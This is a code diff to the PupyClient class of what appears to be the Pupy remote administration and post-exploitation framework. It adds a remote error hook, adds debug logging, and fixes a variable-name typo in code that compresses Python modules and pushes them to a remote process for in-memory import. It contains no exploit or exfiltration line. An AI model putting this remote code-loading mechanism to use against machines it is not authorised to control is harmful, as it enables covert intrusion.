@@ -186,6 +186,8 @@ class PupyClient(object):
         pupyimporter = self.conn.modules.pupyimporter
         pupyimporter.register_package_request_hook(self.remote_load_package)
         self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_request_hook)
+        pupyimporter.register_package_error_hook(self.remote_print_error)
+        self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_error_hook)
 
     def load_dll(self, path):
         """
@@ -245,6 +247,9 @@ class PupyClient(object):
     def remote_load_package(self, module_name):
         return self._load_package(module_name, force=False, remote=True)
 
+    def remote_print_error(self, msg):
+        self.pupsrv.handler.display_error(msg)
+
     def _get_module_dic(self, search_path, start_path, pure_python_only=False):
         modules_dic = {}
         found_files = set()
@@ -252,6 +257,7 @@ class PupyClient(object):
         module_path = os.path.join(search_path, start_path)
         # loading a real package with multiple files
         if os.path.isdir(module_path) and safe_file_exists(module_path):
+            logging.debug("getting module dic for directory: %s"%module_path)
             for root, dirs, files in os.walk(module_path, followlinks=True):
                 for f in files:
                     if root.endswith(('tests', 'test', 'SelfTest', 'examples')) or f.startswith('.#'):
@@ -295,7 +301,7 @@ class PupyClient(object):
                             compile(module_code, modpath, 'exec')
                         )
                         modpath = base+'.pyc'
-
+                    logging.debug("adding to dic file %s"%modpath)
                     modules_dic[modpath] = module_code
 
                 package_found=True
@@ -341,7 +347,7 @@ class PupyClient(object):
 
         update = False
         pupyimporter = self.conn.modules.pupyimporter
-        inital_module_name = module_name
+        initial_module_name = module_name
 
         if not remote:
             if pupyimporter.has_module(module_name):
@@ -483,7 +489,7 @@ class PupyClient(object):
             zlib.compress(cPickle.dumps(modules_dic), 9),
             compressed=True,
             # Use None to prevent import-then-clean-then-search behavior
-            name=(None if remote else inital_module_name)
+            name=(None if remote else initial_module_name)
         )
 
         logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
